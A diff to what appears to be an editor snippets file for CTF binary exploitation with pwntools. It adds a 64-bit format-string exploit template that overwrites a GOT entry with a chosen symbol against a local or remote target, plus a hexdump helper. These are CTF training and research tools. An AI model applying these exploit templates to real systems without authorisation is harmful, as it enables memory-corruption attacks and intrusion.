@@ -97,12 +97,38 @@ snippet fmt "automatic fsb exploit generation"
 		return io.recvall() # io.recvuntil('', drop=True)
 
 	# Construct payload
-	context.clear(arch = '${4:i386 | amd64}') 
+	context.clear(arch = 'i386') 
 	# full list: docs.pwntools.com/en/stable/context.html#pwnlib.context.ContextType.architectures
 	payload = fmtstr_payload(FmtStr(exec_fmt).offset, 
 									{ADDR: VAL_TO_WRITE}, 
 									numbwritten=0, 
 									write_size='byte')
+
+# 64 bit variant of the above which frontloads the format specifiers
+# explanation: https://advancedpersistentjest.com/2016/12/30/writeup-espr-pdfmaker-33c3-part-1-of-2/
+# pwntools frontloads the addresses instead of the format specifiers
+# so instead we'll use https://github.com/Inndy/formatstring-exploit
+snippet fmt6
+	VAL_TO_WRITE = ${1:elf.sym.win}
+	ADDR = ${2:elf.got.printf}
+
+	# Edit this depending on program output
+	def till_fmt(payload, io):
+		io.sendline(payload)
+		#io.recvuntil('')
+
+	def exec_fmt(payload):
+		if remoteflag:
+			io = remote(IP, PORT)
+		else:
+			io = process(FILENAME) # for more args, make a list [FILENAME, a, b, ...]
+
+		till_fmt(payload, io)
+		return io.recvall() # io.recvuntil('', drop=True)
+
+	fmt = FormatString(offset=FmtStr(exec_fmt).offset, written=0, bits=64)
+	fmt[ADDR] = VAL_TO_WRITE
+	payload, sig = fmt.build()
 
 #snippet rop "https://github.com/ctfhacker/ctf-writeups/blob/master/campctf-2015/bitterman-pwn-400/README.md"
 #	from pwn import *
@@ -207,6 +233,17 @@ snippet fump "As above, but 32/64 bit independent. Specifically for bof"
 	print hex(core.fault_addr)
 	print hex(u32(pack(core.fault_addr)[:4]))        
 	print cyclic_find(u32(pack(core.fault_addr)[:4]))
+
+# hexdump a string, stolen from:
+# https://github.com/Inndy/formatstring-exploit#usage
+snippet hexdump
+	def dump(x):
+		try:
+			from hexdump import hexdump
+			hexdump(x)
+		except ImportError:
+			import binascii, textwrap
+			print('\n'.join(textwrap.wrap(binascii.hexlify(x),32)))
 
 ## Z3 ##
 
